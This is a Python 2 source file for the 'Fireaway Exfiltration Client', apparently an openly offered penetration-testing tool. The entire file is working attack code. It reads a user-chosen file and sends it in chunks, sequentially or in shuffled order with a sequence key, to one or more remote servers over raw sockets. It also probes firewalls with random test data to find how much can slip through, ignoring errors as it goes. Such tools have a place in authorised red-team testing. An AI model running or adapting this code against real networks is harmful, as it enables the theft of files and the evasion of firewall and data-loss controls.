#!/usr/bin/python

#Fireaway Client Copyright 2017 Russell Butturini
#This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
#the Free Software Foundation, either version 3 of the License, or
#(at your option) any later version.

#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.

#You should have received a copy of the GNU General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.

import socket
import sys
import string
import textwrap
from random import choice
from random import randint
from time import sleep

def main():
    if len(sys.argv) != 4 or sys.argv[2].isdigit == False or int(sys.argv[2]) < 1 or int(sys.argv[2]) > 65535 or \
                    sys.argv[3].isdigit == False or int(sys.argv[3]) < 0 or int(sys.argv[3]) > 3:
        printHelp()

    else:
        if sys.argv[1].count('.') != 3:  # If there aren't 3 dots, assume it's a file name (yes, this is lame)
            with open(sys.argv[1]) as f:
                serverList = f.readlines()

        else:  # An IP address (or something that looks like an IP address) is in the file name argument
            serverList = sys.argv[1]

        if sys.argv[3] == '0':
            testChunk(serverList, int(sys.argv[2]))

        elif sys.argv[3] == '1':
            sendFileSeq(serverList, int(sys.argv[2]))

        elif sys.argv[3] == '2':
            sendFileRand(serverList,int(sys.argv[2]))

def testChunk(server, port):
    while True:
        try:
            startBytes = int(raw_input('Enter the number initial number of bytes to test: '))
            break

        except ValueError:
            print 'Invalid input!'

    while True:
        try:
            increment = int(raw_input('Enter the number of bytes to increment on each new connection: '))
            break

        except ValueError:
            print 'Invalid input!'

    while True:
        try:
            maxBytes = int(raw_input('Enter the maximum number of test bytes: '))
            break

        except ValueError:
            print 'Invalid input!'

    curBytes = startBytes

    while curBytes < int(maxBytes):
        try:
            testData = ''.join(choice(string.ascii_letters + string.digits + '!@#$%^&*()') for x in range(curBytes))

            if type(server) is str: #Only one server was sent
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(15)
                s.connect((server, port))
                print 'sending ' + str(curBytes) + ' of test data.  Watch the server to see how much is received.'
                s.send(testData)
                s.close()

            elif type(server) is list: #Multiple servers in play
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(15)
                receiver = server[randint(0,len(server)-1)]
                s.connect((receiver, port))
                print 'sending ' + str(curBytes) + ' of test data to ' + receiver.rstrip() + '.  Watch the server to see how much is received.'
                s.send(testData)
                s.close()

        except:
            # Handle aggressive network traffic from the firewall gracefully and keep going.
            pass

        curBytes = curBytes + increment


    print 'Done sending test data.  Check the receiving servers for any issues.'
    sys.exit()

def sendFileSeq(server, port):
    fileName = raw_input('Enter path to file to exfiltrate: ')
    chunkSize = int(raw_input('Enter size of file chunk to send in bytes: '))
    chunkCount = 1
    with open(fileName,'rb') as in_file:

            while True:
                piece = in_file.read(chunkSize)

                if piece == '':
                    break #EOF

                try:
                    if type(server) is str:  # Only one server was sent
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(15)
                        s.connect((server, port))
                        print 'sending chunk ' + str(chunkCount)
                        s.send(piece)
                        s.close()
                        chunkCount += 1
                        sleep(3)

                    elif type(server) is list:  # Multiple servers in play
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(15)
                        receiver = server[randint(0, len(server) - 1)]
                        s.connect((receiver, port))
                        print 'sending chunk ' + str(chunkCount) + ' to ' + receiver
                        s.send(piece)
                        s.close()
                        chunkCount += 1
                        sleep(3)

                except Exception, e:
                    #Handle aggressive network traffic from the firewall and keep going
                    print 'Got something bad back.  Going to plug on...'
                    print str(e) #debug
                    pass

    print 'Finished sending file.  Check ReceivedData.txt on the server for results.'

def sendFileRand(server,port):
    fileName = raw_input('Enter path to file to exfiltrate: ')
    chunkSize = int(raw_input('Enter size of file chunk to send in bytes: '))
    seqKeyID = raw_input('Enter the sequence key ID from the remote servers: ')

    with open(fileName) as f:
        unSplitFile = f.read()
        f.close()

    #splitFile = wrap(unSplitFile,chunkSize)
    splitFile = textwrap.TextWrapper(width=chunkSize,break_long_words=False,replace_whitespace=False).wrap(unSplitFile)
    transmitFile = []
    transmitIndices = []
    sequenceKey = seqKeyID
    keyTransmitted = False
    delimiters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%^&*()'
    pieceIndices = range(len(splitFile))

    while True:
        if len(pieceIndices) > 1:
            index = pieceIndices[randint(0,len(pieceIndices)-1)]

        else:
            index = pieceIndices[0]

        transmitFile.append(splitFile[index])
        transmitIndices.append(index)


        if len(pieceIndices) > 1:
            pieceIndices.remove(index)

        else:
            break

    for chunkSequence in transmitIndices: #build the sequence key
            sequenceKey += str(chunkSequence) + delimiters[randint(0,len(delimiters)-1)]

    while len(transmitFile) > 0:
        try:
            if keyTransmitted == False:
                #Send the sequence key first
                if type(server) is str:  # Only one server was sent
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(15)
                    s.connect((server, port))
                    s.send(sequenceKey)
                    s.close()
                    keyTransmitted = True

                elif type(server) is list:  # Multiple servers in play
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(15)
                    receiver = server[randint(0, len(server) - 1)]
                    s.connect((receiver, port))
                    print 'sending sequence key to  ' + receiver
                    s.send(sequenceKey)
                    s.close()
                    keyTransmitted = True

            else: # Transmit data
                if type(server) is str:  # Only one server was sent
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(15)
                    s.connect((server, port))
                    print 'sending chunk ' + str(transmitIndices[0])
                    s.send(transmitFile[0])
                    s.close()
                    transmitFile.pop(0)
                    transmitIndices.pop(0)

                elif type(server) is list:  # Multiple servers in play
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(15)
                    receiver = server[randint(0, len(server) - 1)]
                    s.connect((receiver, port))
                    print 'sending chunk ' + str(transmitIndices[0]) + ' to ' + receiver
                    s.send(transmitFile[0])
                    s.close()
                    transmitFile.pop(0)
                    transmitIndices.pop(0)
                    sleep(3)

        except Exception,e:
            print 'bad stuff.'

def printHelp():
    print 'Fireaway Exfiltration Client v0.2'
    print 'Usage:  fa_client <fa_server IP or path to server list> <port> <mode>'
    print 'Valid options for mode:'
    print '0-Send random test data to find maximum leaked data fragment size'
    print '1-Exfiltrate a file sequentially'
    print '2-Exfiltrate a file in random chunks'
    sys.exit()


if __name__ == '__main__':
    main()
